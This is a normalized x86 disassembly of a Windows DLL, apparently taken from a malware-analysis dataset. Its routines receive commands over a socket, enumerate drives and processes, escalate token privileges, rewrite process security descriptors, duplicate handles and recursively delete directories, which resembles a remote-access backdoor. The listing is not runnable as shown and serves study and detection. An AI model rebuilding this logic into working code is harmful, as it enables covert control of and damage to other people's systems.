mov [ esp + 0x10 ] eax
mov ebp eax
mov esi 0x1
test esi esi
je r-xdata
call edi
mov ebp eax
call sub_10002440
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
call sub_100033b0
mov esi eax
add esp 0x4
neg esi
sbb esi esi
inc esi
call edi
sub eax [ esp + 0x10 ]
cmp eax 0x493e0
jbe r-xdata
lea ecx [ esp + 0x18 ]
push 0x4
push ecx
push 0x4
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x30 ] 0x1
call ebx
call edi
sub eax ebp
cmp eax 0x36ee80
jbe r-xdata
xor esi esi
sub_10004e40
push ebx
mov ebx [ GetTickCount@IAT ]
push ebp
push esi
push edi
call ebx
mov ebp [ Sleep@IAT ]
mov edi eax
mov [ rw-data ] edi
call ebx
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_100039f0
mov edi esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x4
push 0xa
call ebp
jmp r-xdata
call ebx
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
sub_10004eb0
mov eax 0x2004
call sub_10008f00
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov [ rw-data ] 0x0
mov cl [ esp + 0x14 ]
sub ebp 0x5
mov [ rw-data ] cl
mov [ rw-data ] 0x0
call sub_10005000
test eax eax
je r-xdata
mov [ rw-data ] 0x0
mov edi [ rw-data ]
mov ecx eax
lea esi [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub ebp [ rw-data ]
test ebp ebp
jg r-xdata
mov eax [ rw-data ]
pop edi
pop esi
pop ebp
test eax eax
pop ebx
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x5
push eax
call sub_10005090
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov [ rw-data ] 0x1
xor eax eax
add esp 0x2004
retn 0x4
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ebp [ esp + 0x15 ]
cmp ebp 0x5
jl r-xdata
push 0x1
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
test ebp ebp
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp [ esp + 0x14 ] 0x5a
jne r-xdata
lea edx [ esp + 0x14 ]
push ebp
push edx
call sub_10005090
add esp 0x8
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
sub_10005000
push ecx
push ebx
push ebp
mov ebp [ Sleep@IAT ]
push esi
mov esi [ recv@IAT ]
xor ebx ebx
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x13 ]
push 0x1
push eax
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
push 0x0
mov [ rw-data ] 0x1
call [ ExitThread@IAT ]
test eax eax
jle r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
call ebp
jmp r-xdata
mov al [ esp + 0xf ]
cmp al 0xd
je r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x1
call ebp
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
inc ebx
cmp ebx 0x4
jge r-xdata
cmp al 0xa
je r-xdata
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
push 0x1
xor ebx ebx
call ebp
jmp r-xdata
sub_10005090
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
xor esi esi
xor ebx ebx
push edi
cmp eax 0x2000
mov edi eax
jle r-xdata
test eax eax
jle r-xdata
mov edi 0x2000
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
mov edx [ rw-data ]
mov eax edi
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ recv@IAT ]
test eax eax
jg r-xdata
push 0x0
mov [ rw-data ] 0x1
call [ ExitThread@IAT ]
add esi eax
xor ebx ebx
call [ WSAGetLastError@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
jmp r-xdata
push 0x1
call [ Sleep@IAT ]
cmp esi edi
jl r-xdata
sub_10005130
sub esp 0x48c
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x9d ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x98 ] 0x41
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x298 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
mov ebp ecx
mov ecx [ rw-data ]
add ebp 0x6
push 0x200
mov [ esp + 0x18 ] 0x0
mov [ esp + ebp + 0xa0 ] ecx
add ebp 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x98 ]
push ebp
push edx
mov [ esp + 0xa1 ] ebp
call sub_10003f40
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x48c
retn
mov al [ esp + 0x298 ]
test al al
je r-xdata
push ebx
lea ebx [ esp + 0x29c ]
mov [ esp + 0x1c ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x30 ]
push 0x80
push ecx
push ebx
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea esi [ esp + ebp + 0x9c ]
[ edi ]
not ecx
dec ecx
mov edi ebx
mov edx ecx
or ecx 0xffffffff
inc edx
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x1c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add ebp edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ esp + 0x10 ] eax
je r-xdata
pop ebx
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebp + 0x9c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
mov eax [ esp + 0x14 ]
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
mov ecx [ esp + 0x10 ]
mov [ esp + ebp + 0x9c ] ecx
mov ecx [ esp + 0x18 ]
add eax ecx
add ebp 0x4
mov [ esp + 0x14 ] eax
lea ebx [ esp + eax + 0x29c ]
mov al [ esp + eax + 0x29c ]
test al al
jne r-xdata
sub_100052d0
sub esp 0x2c
mov ecx [ esp + 0x34 ]
lea edx [ esp ]
mov [ esp + 0xc ] ecx
push ebx
lea ecx [ esp + 0x38 ]
xor ebx ebx
mov [ esp + 0x2c ] edx
push ecx
lea edx [ esp + 0x14 ]
mov eax 0x1
push ebx
push edx
push eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] al
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x48 ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push esi
push ebx
push eax
push ebx
push ebx
push 0x4
push 0x6
push ecx
call SetSecurityInfo
mov edx [ esp + 0x3c ]
mov esi eax
push edx
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
pop esi
pop ebx
sete al
add esp 0x2c
retn
sub_10005380
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
mov [ esp + 0x18 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x10
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x10
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
add esp 0x10
retn
sub_10005410
sub esp 0x220
mov eax [ esp + 0x228 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x230 ]
push edi
mov edi [ OpenProcess@IAT ]
push esi
push 0x0
push eax
call edi
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
push esi
push eax
push 0x40000
call edi
mov ebx [ GetCurrentProcess@IAT ]
mov ebp [ DuplicateHandle@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
mov esi [ esp + 0x238 ]
push esi
push eax
call sub_100052d0
add esp 0x8
lea eax [ esp + 0x18 ]
push 0x0
push 0x0
push esi
push eax
call ebx
mov ecx [ esp + 0x20 ]
push eax
push ecx
call ebx
push eax
call ebp
test eax eax
jne r-xdata
lea ecx [ esp + 0x14 ]
push ecx
push 0x28
call ebx
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ CloseHandle@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push edx
push rw-data
push eax
call sub_10005380
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
mov edx [ esp + 0x14 ]
push edx
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push esi
push 0x0
push 0x80000
call edi
mov esi eax
test esi esi
je r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x20 ]
push eax
push ecx
call sub_100053f0
add esp 0x8
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push ecx
lea edx [ esp + 0x34 ]
push 0x200
push edx
push 0x1
push eax
mov [ esp + 0x30 ] 0x200
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x30 ]
push 0x0
push 0x0
push 0x0
push ecx
push 0x1
push 0x6
push esi
call SetSecurityInfo
test eax eax
jne r-xdata
push eax
push eax
lea edx [ esp + 0x18 ]
push 0x40000
push edx
call ebx
push eax
push esi
call ebx
push eax
call ebp
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
sub_10005590
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
cmp [ ebx ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov edi [ _strnicmp@IAT ]
push ebp
not ecx
dec ecx
push rw-data
push ebx
mov esi ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
push esi
push rw-data
push ebx
call edi
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esi + ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + ebp ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_100056c0
mov eax 0x2740
call sub_10008f00
mov eax [ rw-data ]
push ebx
push ebp
push esi
xor esi esi
cmp eax 0x2
push edi
mov ebx 0x5
mov [ esp + 0x750 ] 0x43
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
jne r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebp eax
cmp ebp 0xffffffff
mov [ esp + 0x10 ] ebp
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
test esi esi
jne r-xdata
lea eax [ esp + 0x28 ]
mov [ esp + 0x28 ] 0x128
push eax
push ebp
call Process32First
test eax eax
jne r-xdata
mov ebp [ esp + 0x10 ]
push 0x0
call [ FreeLibrary@IAT ]
mov edi [ GetProcAddress@IAT ]
push rw-data
push esi
call edi
mov ebp eax
push rw-data
push esi
mov [ esp + 0x20 ] ebp
call edi
test ebp ebp
mov [ esp + 0x14 ] eax
je r-xdata
mov [ esp + 0x751 ] ebx
jmp r-xdata
push esi
call [ FreeLibrary@IAT ]
mov [ esp + 0x751 ] ebx
jmp r-xdata
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x150 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x30 ]
push ecx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
push esi
call [ rw-data ]
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x2
jne r-xdata
jmp r-xdata
cmp ebp 0xffffffff
je r-xdata
mov ebp [ esp + 0x10 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x30 ]
push 0x410
push edx
call sub_10005410
add esp 0x8
mov ebp eax
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x1c ]
push eax
push 0x4
push ecx
push ebp
call [ esp + 0x28 ]
test eax eax
je r-xdata
lea eax [ esp + 0x750 ]
push ebx
push eax
mov [ esp + 0x759 ] ebx
call sub_10003f40
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x2740
retn
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
lea edi [ esp + 0x4c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x450 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x24 ] 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x154 ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x650 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x150 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x650 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x350 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
push ecx
push edx
call [ GetUserNameA@IAT ]
lea edx [ esp + 0x350 ]
push edx
push ebp
call sub_10007960
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x450 ]
push 0x200
push edx
push eax
push ebp
call [ esp + 0x24 ]
lea ecx [ esp + 0x450 ]
push ecx
call sub_10005590
add esp 0x4
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x150 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x450 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push ebp
call [ CloseHandle@IAT ]
mov ebp [ esp + 0x10 ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x350 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x150 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x150 ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x450 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x150 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + ebx + 0x750 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x150 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x150 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x350 ]
lea edx [ ebx + ecx + 0x1 ]
mov ecx [ esp + 0x30 ]
mov [ esp + edx + 0x750 ] ecx
add edx 0x4
lea ebx [ esp + edx + 0x750 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x350 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea ebx [ edx + ecx + 0x1 ]
mov ecx [ esp + 0x3c ]
lea edx [ esp + 0x28 ]
push edx
mov [ esp + ebx + 0x754 ] ecx
push ebp
add ebx 0x4
call Process32Next
test eax eax
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x450 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub_10005b30
mov eax [ esp + 0x4 ]
push 0x1
push eax
call sub_10005410
add esp 0x8
test eax eax
je r-xdata
xor eax eax
retn
push 0x1
push eax
call [ rw-data ]
retn
sub_10005b80
mov eax [ esp + 0x4 ]
push eax
push 0x0
push 0x1
call [ OpenProcess@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
push 0x1
push eax
call [ rw-data ]
retn
sub_10005bf0
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub esp 0x210
mov edx ecx
shr ecx 0x2
push ebx
push ebp
push esi
push edi
mov esi eax
lea edi [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx edx
push 0x5c
and ecx 0x3
push eax
[ edi ] [ esi ]
mov esi [ strrchr@IAT ]
call esi
push eax
call sub_10005ef0
lea eax [ esp + 0x2c ]
push 0x5c
push eax
call esi
add esp 0x14
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
push 0x7d00
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov [ esp + 0x1c ] 0x42
and ecx 0x3
[ edi ] [ esi ]
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov [ eax + 0x1 ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
lea eax [ esp + 0x20 ]
push eax
call sub_10005e50
mov esi eax
add esp 0x4
cmp esi 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
test esi esi
jne r-xdata
lea ecx [ esi + esi * 4 ]
lea edx [ esp + 0x18 ]
shl ecx 0x6
add ecx 0x5
push 0x5
push edx
mov [ esp + 0x21 ] ecx
call sub_10003f40
add esp 0x8
lea eax [ esp + 0x20 ]
push ebx
push eax
call [ rw-data ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov esi 0x1
push ebx
call sub_10005f50
add esp 0x4
test eax eax
je r-xdata
or ecx eax
mov edi rw-data
xor eax eax
lea edx [ ebx + 0x2c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x140
push ebx
call sub_10004780
push 0x140
push ebx
call sub_10003e90
push ebx
call [ free@IAT ]
add esp 0x1c
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
xor ebp ebp
dec esi
test esi esi
mov [ esp + 0x10 ] esi
jle r-xdata
lea edx [ esp + 0x14 ]
push edx
push ebx
push 0x140
push ebx
call sub_10004780
push 0x140
push ebx
call sub_10003e90
add esp 0x18
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
push ebx
push edi
call sub_10005de0
add esp 0x8
cmp eax 0xffffffff
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push edi
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x210
retn
add ebp eax
lea esi [ eax + eax * 4 ]
lea eax [ esp + 0x14 ]
shl esi 0x6
push eax
push ebx
push esi
push ebx
call sub_10004780
push esi
push ebx
call sub_10003e90
add esp 0x18
test eax eax
je r-xdata
cmp ebp [ esp + 0x10 ]
jl r-xdata
sub_10005de0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ FindNextFileA@IAT ]
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
push ebx
xor edi edi
call ebp
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_10008160
push esi
call sub_10005f50
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x64
jge r-xdata
inc edi
add esi 0x140
push esi
push ebx
call ebp
test eax eax
jne r-xdata
sub_10005e50
mov ecx [ esp + 0x4 ]
sub esp 0x140
lea eax [ esp ]
push ebx
push esi
push edi
push eax
push ecx
xor edi edi
call [ rw-data ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x140
retn
mov ebx [ FindNextFileA@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc edi
push esi
call [ FindClose@IAT ]
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x140
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
call [ FindClose@IAT ]
call sub_10008160
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x140
retn
lea eax [ esp + 0xc ]
push eax
push esi
call ebx
test eax eax
je r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
lea edx [ esp + 0xc ]
push edx
call sub_10005f50
add esp 0x4
test eax eax
je r-xdata
sub_10005ef0
mov edx [ esp + 0x4 ]
mov [ rw-data ] 0x0
test edx edx
je r-xdata
retn
push ebx
mov ebx [ strchr@IAT ]
push esi
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov [ edx ] 0x0
test edx edx
jne r-xdata
mov eax [ rw-data ]
mov [ eax * 4 + rw-data ] esi
inc eax
mov [ rw-data ] eax
lea esi [ edx + 0x1 ]
push 0x3b
push esi
call ebx
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
sub_10005f50
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
test [ ebp ] 0x10
je r-xdata
add ebp 0x2c
push 0x2e
push ebp
call [ strrchr@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
add esp 0x8
mov [ esp + 0x18 ] 0x0
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov ebx rw-data
mov eax [ esp + 0x18 ]
mov ecx [ rw-data ]
inc eax
add ebx 0x4
cmp eax ecx
mov [ esp + 0x18 ] eax
jl r-xdata
mov esi [ lstrcmpiA@IAT ]
push rw-data
push edx
call esi
test eax eax
je r-xdata
mov edx [ ebx ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebx ]
push rw-data
push ecx
call esi
test eax eax
je r-xdata
mov eax [ ebx ]
or ecx 0xffffffff
lea edx [ eax + 0x2 ]
xor eax eax
mov edi edx
[ edi ]
not ecx
dec ecx
mov esi ecx
je r-xdata
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
sub ecx esi
lea eax [ ecx + ebp ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
sub_10006060
mov eax [ rw-data ]
sub esp 0x844
test eax eax
push ebx
push ebp
push esi
push edi
je r-xdata
mov ebx [ esp + 0x858 ]
lea eax [ esp + 0x654 ]
push ebx
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x654 ]
push ecx
push edx
call [ rw-data ]
mov ebp [ esp + 0x85c ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x844
retn
cmp ebp 0x4c
jne r-xdata
mov esi [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x844
retn
push ebx
call [ RemoveDirectoryA@IAT ]
test eax eax
jne r-xdata
push esi
call [ FindClose@IAT ]
cmp [ esp + 0x40 ] 0x2e
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x844
retn
lea edi [ esp + 0x40 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x354 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov al [ esp + 0x14 ]
and ecx 0x3
test al 0x10
[ edi ] [ esi ]
je r-xdata
lea eax [ esp + 0x354 ]
lea ecx [ esp + 0x154 ]
push eax
push ebx
push rw-data
push ecx
call [ sprintf@IAT ]
lea eax [ ebp - 0x4c ]
add esp 0x10
